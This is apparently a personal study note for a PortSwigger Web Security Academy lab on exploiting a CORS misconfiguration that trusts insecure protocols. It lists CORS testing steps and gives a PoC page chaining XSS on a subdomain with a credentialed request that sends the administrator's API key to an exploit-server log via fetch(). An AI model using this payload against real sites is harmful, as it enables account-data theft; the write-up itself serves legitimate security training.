---
tags:
  - PRACTITIONER
Link:
  - "[[CORS]]"
External Link:
  - https://portswigger.net/web-security/cors/lab-breaking-https-attack
---

# CORS vulnerability with trusted insecure protocols
---

**Target Goal** - Exploit the CORS misconfiguration to retrieve the administrator's API key

**Creds** - wiener : peter

**Analysis:**

**Testing for CORS misconfigurations:**
1. Change the origin to an arbitrary value
2. Change the origin header to the null value4
3. Change the origin header to one that begins with the origin of the site.
4. Change the origin header to one that ends with the origin of the site.

**POC**:

```html
<html>
	<body>
		<h1>Hello World!</h1>
		<script>
			document.location="http://stock.YOUR-URL-HERE.web-security-academy.net/?productId=<script>var xhr = new XMLHttpRequest();var url = 'https://YOUR-URL-HERE.web-security-academy.net';xhr.onreadystatechange = function() {if (xhr.readyState == XMLHttpRequest.DONE){fetch('https://exploit-YOUR-URL-HERE.exploit-server.net/log?key=' %2b xhr.responseText)};};xhr.open('GET', url %2b '/accountDetails', true);xhr.withCredentials = true;xhr.send(null)%3c/script>&storeId=1"
		</script>
	</body>
</html>
```

